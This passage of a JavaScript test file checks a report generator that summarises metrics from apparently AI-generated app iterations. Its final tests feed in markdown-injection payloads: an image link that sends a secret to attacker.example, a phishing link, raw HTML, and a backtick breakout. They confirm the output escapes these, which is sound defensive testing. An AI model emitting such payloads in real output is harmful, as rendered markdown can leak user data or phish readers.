        iteration: 2,
        fixAttempts: 5,
        exitStage: "accessibility",
        fixLog: [
          { attempt: 1, stage: "lint" },
          ...Array.from({ length: 4 }, (_, i) => ({ attempt: i + 2, stage: "accessibility" })),
        ],
      },
      { ...base, iteration: 3, fixAttempts: 0, exitStage: "clean", fixLog: [] },
    ];

    try {
      await generateReport({ demo: iterations }, dir);
      const fa = JSON.parse(await readFile(join(dir, "report.json"), "utf-8")).prompts.demo
        .fixAttempts;

      expect(fa.byStage.build).toEqual({ total: 5, average: 1.667, iterationsAffected: 1 });
      expect(fa.byStage.accessibility).toEqual({ total: 4, average: 1.333, iterationsAffected: 1 });
      expect(fa.byStage.lint).toEqual({ total: 1, average: 0.333, iterationsAffected: 1 });
      // Iteration 2 built fine — only iteration 1 counts as a build failure.
      expect(fa.iterationsBuildCleanOnFirstTry).toBe(2);
      // But only iteration 3 needed no fixes of any kind.
      expect(fa.iterationsCleanOnFirstTry).toBe(1);
      expect(fa.perIteration[0]).toMatchObject({ buildFixes: 5, accessibilityFixes: 0 });
      expect(fa.perIteration[1]).toMatchObject({
        buildFixes: 0,
        accessibilityFixes: 4,
        lintFixes: 1,
      });

      const md = await readFile(join(dir, "report.md"), "utf-8");
      expect(md).toContain("Build fixes (app didn't compile/render) \u2014 total | 5");
      expect(md).toContain("Accessibility fixes (rendered, axe violations) \u2014 total | 4");
      expect(md).toContain("**Iteration 1:** 5 fix(es) needed (5 build)");
      expect(md).toContain("**Iteration 2:** 5 fix(es) needed (4 accessibility, 1 lint)");
    } finally {
      await rm(dir, { recursive: true, force: true });
      log.mockRestore();
      warn.mockRestore();
    }
  });
});

// ---------------------------------------------------------------------------
// Built-iteration filtering — runtime metrics should NOT count broken builds
// ---------------------------------------------------------------------------
describe("generateReport excludes broken builds from runtime metrics", () => {
  it("does not aggregate DOM / a11y / semantic data from exitStage='build' iterations", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => {});
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const dir = await mkdtemp(join(tmpdir(), "at-report-"));

    // One healthy iteration and one that exhausted its fix budget on the
    // build gate. The runner still stamps measurements against the
    // broken dev server, so the "broken" iteration carries plausible-
    // looking but wrong-on-purpose values that must be excluded.
    const iterations = [
      {
        iteration: 1,
        elapsedSeconds: 8,
        linesOfCode: 30,
        files: [{ path: "src/App.tsx", content: "export default () => null;\n" }],
        componentImports: [],
        fixAttempts: 0,
        exitStage: "clean",
        domElementCount: 100,
        domHtmlBytes: 4096,
        semanticHtml: {
          total: 10,
          semanticCount: 8,
          genericCount: 2,
          roleCount: 1,
          semanticRatio: 0.8,
          semanticByTag: { main: 1 },
          genericByTag: { div: 2 },
          rolesByValue: {},
        },
        a11yResults: { axeViolationCount: 0, axeViolations: [], summary: { passed: true } },
        lighthouseResults: { fcpMs: 200, lcpMs: 400, tbtMs: 0, ttiMs: 500, performanceScore: 95 },
      },
      {
        iteration: 2,
        elapsedSeconds: 30,
        linesOfCode: 25,
        files: [{ path: "src/App.tsx", content: "broken\n" }],
        componentImports: [],
        fixAttempts: 5,
        exitStage: "build",
        // These values are what the broken-page measurement pass writes —
        // a half-rendered DOM, a degenerate axe pass, etc.
        domElementCount: 4,
        domHtmlBytes: 200,
        semanticHtml: {
          total: 1,
          semanticCount: 0,
          genericCount: 1,
          roleCount: 0,
          semanticRatio: 0,
          semanticByTag: {},
          genericByTag: { div: 1 },
          rolesByValue: {},
        },
        a11yResults: { axeViolationCount: 12, axeViolations: [], summary: { passed: false } },
        lighthouseResults: null,
      },
    ];

    try {
      await generateReport({ demo: iterations }, dir);
      const reportJson = JSON.parse(await readFile(join(dir, "report.json"), "utf-8"));
      const data = reportJson.prompts.demo;

      // The "build failed" iteration must NOT contribute to runtime metrics.
      expect(data.builtIterations).toBe(1);
      expect(data.unbuiltIterations).toBe(1);
      expect(data.domElements.average).toBe(100); // not (100 + 4) / 2
      expect(data.accessibility.totalViolations).toBe(0); // not 12
      expect(data.accessibility.iterationsWithResults).toBe(1);
      expect(data.semanticHtml.avgSemanticCount).toBe(8); // not (8 + 0) / 2
      expect(data.lighthouse.iterationsWithResults).toBe(1);
      // Source-derived metrics still see both iterations.
      expect(data.linesOfCode.average).toBe(27.5); // (30 + 25) / 2
    } finally {
      await rm(dir, { recursive: true, force: true });
      log.mockRestore();
      warn.mockRestore();
    }
  });
});

// ---------------------------------------------------------------------------
// Empty-input guards
// ---------------------------------------------------------------------------
describe("computeCodeVariance with file-less iterations", () => {
  it("does not score two file-less iterations as identical", () => {
    const result = computeCodeVariance([
      { iteration: 1, files: [] },
      { iteration: 2, files: [] },
    ]);
    // Jaccard of two empty n-gram sets is 1 — these must be excluded,
    // leaving fewer than 2 comparable iterations.
    expect(result.averageContentSimilarity).toBeNull();
    expect(result.pairwiseContentSimilarity).toEqual([]);
  });

  it("compares only iterations that produced files", () => {
    const file = { path: "a.tsx", content: "export const x = 1;" };
    const result = computeCodeVariance([
      { iteration: 1, files: [file] },
      { iteration: 2, files: [] },
      { iteration: 3, files: [file] },
    ]);
    expect(result.pairwiseContentSimilarity).toHaveLength(1);
    expect(result.averageContentSimilarity).toBe(1);
  });
});

describe("generateReport with all iterations failed", () => {
  it("renders dashes instead of Infinity", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => {});
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const dir = await mkdtemp(join(tmpdir(), "at-report-"));

    const iterations = [
      {
        iteration: 1,
        elapsedSeconds: 12,
        testLabel: "demo",
        error: "All 3 generation attempts returned no parseable files.",
        linesOfCode: 0,
        files: [],
        componentImports: [],
      },
    ];

    try {
      const report = await generateReport({ demo: iterations }, dir);
      const md = await readFile(join(dir, "report.md"), "utf-8");

      expect(md).not.toContain("Infinity");
      expect(report.prompts.demo.timing.minSeconds).toBeNull();
      expect(report.prompts.demo.linesOfCode.max).toBeNull();
      expect(report.prompts.demo.fixAttempts.min).toBeNull();
    } finally {
      await rm(dir, { recursive: true, force: true });
      log.mockRestore();
      warn.mockRestore();
    }
  });
});

// ---------------------------------------------------------------------------
// Security: attacker-controlled artifact text must not become active markdown
// ---------------------------------------------------------------------------
describe("generateReport neutralizes untrusted artifact text", () => {
  it("escapes markdown/HTML in feedback text and category so no active links, images, or table breakouts survive", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => {});
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const dir = await mkdtemp(join(tmpdir(), "at-report-"));

    const iterations = [
      {
        iteration: 1,
        elapsedSeconds: 10,
        linesOfCode: 50,
        files: [{ path: "src/App.tsx", content: "export default () => null;\n" }],
        componentImports: [],
        fixAttempts: 0,
        inlineStyles: { total: 0, byComponent: {}, byProperty: {} },
        domElementCount: 120,
        // Adversarial free-text feedback the agent fully controls.
        feedback: [
          {
            category: "api|`x`",
            text: "friction ![](https://attacker.example/leak?d=SECRET) and [click](https://attacker.example/phish) <img src=x>",
          },
        ],
      },
    ];

    try {
      await generateReport({ demo: iterations }, dir);
      const md = await readFile(join(dir, "report.md"), "utf-8");

      // The image/link syntax must be defanged: no raw `![](` or `](http`
      // sequence that a renderer would auto-load or make clickable.
      expect(md).not.toContain("![](https://attacker.example");
      expect(md).not.toContain("](https://attacker.example/phish)");
      // Raw HTML angle brackets are entity-escaped.
      expect(md).not.toContain("<img src=x>");
      // The attacker host string itself may remain (as inert text), but only
      // with the markdown control characters escaped around it.
      expect(md).toContain("\\!\\[\\]\\(https://attacker.example");
      // Category pipe must be escaped so it can't break the category table row.
      expect(md).not.toMatch(/\|\s*api\|`x`\s*\|/);
    } finally {
      await rm(dir, { recursive: true, force: true });
      log.mockRestore();
      warn.mockRestore();
    }
  });

  it("sanitizes inline-CSS property names in the property table (backtick code-span breakout)", async () => {
    const log = vi.spyOn(console, "log").mockImplementation(() => {});
    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    const dir = await mkdtemp(join(tmpdir(), "at-report-"));

    // A property name captured from a quoted JSX style key can contain a
    // backtick that closes the code span, then active markdown.
    const evilProp = "`](https://attacker.example/b.png)![";
    const iterations = [
      {
        iteration: 1,
        elapsedSeconds: 10,
        linesOfCode: 50,
        files: [{ path: "src/App.tsx", content: "export default () => null;\n" }],
        componentImports: [],
        fixAttempts: 0,
        inlineStyles: {
          total: 3,
          byComponent: { div: 3 },
          byProperty: { [evilProp]: 3 },
        },
        componentUsage: { total: 3, byComponent: { div: 3 } },
        domElementCount: 120,
        feedback: [],
      },
    ];

    try {
      await generateReport({ demo: iterations }, dir);
      const md = await readFile(join(dir, "report.md"), "utf-8");
      // The attacker's backtick — which would close the code span and turn
      // the trailing `](url)![` into an active link/image — is neutralized,
      // so the raw property (with its leading backtick) never appears and no
      // "backtick immediately followed by ](" breakout sequence exists. The
      // url may remain as inert text *inside* the code span, which is safe.
      expect(md).not.toContain(evilProp);
      expect(md).not.toMatch(/`\]\(/);
    } finally {
      await rm(dir, { recursive: true, force: true });
      log.mockRestore();
      warn.mockRestore();
    }
  });
});
